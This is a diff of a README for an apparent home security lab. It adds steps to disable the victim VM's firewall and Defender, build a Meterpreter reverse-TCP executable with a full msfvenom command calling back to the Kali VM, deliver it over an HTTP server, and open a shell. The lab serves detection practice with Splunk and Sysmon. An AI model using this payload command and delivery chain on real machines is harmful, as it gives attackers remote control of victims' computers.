@@ -88,7 +88,7 @@ Once that was through, I wanted to double-check that the installation went throu
 
 <img width="1678" height="1134" alt="Screenshot_20260127_215857-1" src="https://github.com/user-attachments/assets/5d514498-4ba2-420c-94ae-887058a9836a" />
 
-
+To ensure that Splunk was set up to intake Sysmon's telemmetry, I first went into my Splunk directory and copied over the inputs.conf file from the defaults folder into the local folder. From there, 
 
 ## Setting up the Kali Machine
 
@@ -96,7 +96,7 @@ Once that was through, I wanted to double-check that the installation went throu
 
 
 ### Statically Assigning The Kali VM's IP Address
-To setu up the Kali machine, I configured the following under the network properties.
+To set up the Kali machine, I configured the following under the network properties.
 
 ```shell
 IP: 10.10.0.11
@@ -116,7 +116,7 @@ For this attack to go through, I'm going to want the Windows Remote Desktop Prot
 <img width="1992" height="1345" alt="image" src="https://github.com/user-attachments/assets/f011e8dd-55a4-438f-984f-8e3b63678543" />
 
 
-Now that I'm ready for the attack to go through, I disabled the Windows Firewall on the victim machine through the control panel to allow for the sample attack to go through
+Now that I'm ready for the attack to go through, I disabled the Windows Firewall on the victim machine through the control panel to allow for the sample attack to go through. I also disabled windows defender realtime virus protection so that the malware itself could run.
 
 <img width="2014" height="1337" alt="image" src="https://github.com/user-attachments/assets/6913f7da-9e5d-46e4-8eba-7adc0c477ab7" />
 
@@ -132,7 +132,31 @@ Through this, I noticed that port 3389 (The port used for Microsoft RDP) was ope
 <img width="1561" height="344" alt="image" src="https://github.com/user-attachments/assets/b3a42568-ff85-4a5d-a1c7-2f19b4fefaff" />
 
 
-With the payload in hand, the command msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.0.11 lport=4444 -f exe -o malware_file.exe can be used to generate the virus. Here, the meterpereter shell that is set to report back to the Kali machine's IP at teh default meterpreter port (4444). The malware itself is saved to an exe file that we'll be sending over to our Windows machine,
+With the payload in hand, the command msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.0.11 lport=4444 -f exe -o malware_file.exe can be used to generate the virus. Here, the meterpereter shell that is set to report back to the Kali machine's IP at the default meterpreter port (4444). The malware itself is saved to an exe file that we'll be sending over to our Windows machine,
 
 <img width="1736" height="739" alt="image" src="https://github.com/user-attachments/assets/9a8b1119-1ae5-4103-8a91-df89a2256bd5" />
 
+After that, I opened up metasploit and used the command use exploit/multi/handler to set up a listener for the malware we just created
+<img width="1759" height="1226" alt="image" src="https://github.com/user-attachments/assets/bf0efd36-c3fa-455b-8f90-686a1ff00e9b" />
+
+I then set the payload to the same one we're using, and set the lhost to the ip fof my machine, and used the exploit command to have my meterpreter shell start listening.
+<img width="534" height="86" alt="image" src="https://github.com/user-attachments/assets/8fc3a159-ea5c-41d0-9443-fb07dec8cb92" />
+
+## Getting The Malware Onto The Windows Machine
+
+I set up an http server on the kali machine so that the malware could be downloaded on the windows machine (After moving the malware file itself to the documents folder for convenience sake)
+<img width="1696" height="613" alt="image" src="https://github.com/user-attachments/assets/a2e9368b-e715-4f39-8496-d5a8baf776fc" />
+
+I then connected to port 9999 on my kali machine using my windows machine's browser, and from there I was able to download the malware file
+<img width="2084" height="1203" alt="image" src="https://github.com/user-attachments/assets/fdddf6dc-df34-42cf-a053-26f501026076" />
+
+After downloading and running the malware, I can run the command netstat -anob in an admin enabled command prompt window to check for an established connection to the kali machine straight from the windows machine. And sure enough, it ends up showing up.
+<img width="1799" height="1274" alt="image" src="https://github.com/user-attachments/assets/9c1da09a-1226-4a45-9b40-dafaa7fc25c0" />
+
+Back in Kali, I can see my handler is recognizing this connection.
+
+<img width="1182" height="453" alt="image" src="https://github.com/user-attachments/assets/35fdf88c-b2dd-4133-8868-394d84e705db" />
+
+
+Using the shell command to establsih a shell on the windows machine, I typed in a few commands into the shell to be run on the Windows machine.
+<img width="1876" height="1221" alt="image" src="https://github.com/user-attachments/assets/f5cc250c-e59c-4b29-aba2-325cb480fef4" />
